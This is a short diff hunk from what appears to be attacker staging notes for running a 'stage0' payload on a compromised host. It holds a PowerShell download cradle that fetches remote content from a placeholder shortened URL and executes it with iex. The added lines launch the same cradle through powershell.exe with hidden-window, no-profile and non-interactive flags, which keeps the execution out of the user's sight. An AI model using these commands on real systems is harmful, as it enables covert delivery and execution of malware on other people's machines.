@@ -6,3 +6,7 @@
 # get a shortened URL to the host, or memorize the IP.
 # Execute stage0 on a host, could be shellcode, or just execution
 iex (iwr http://bit.ly/xxxxxx/index.html).content
+
+# or if you need to kick off powershell as well
+powershell.exe -NoP -sta -NonI -W Hidden "iex (iwr http://bit.ly/xxxxxx/index.html).content"
+
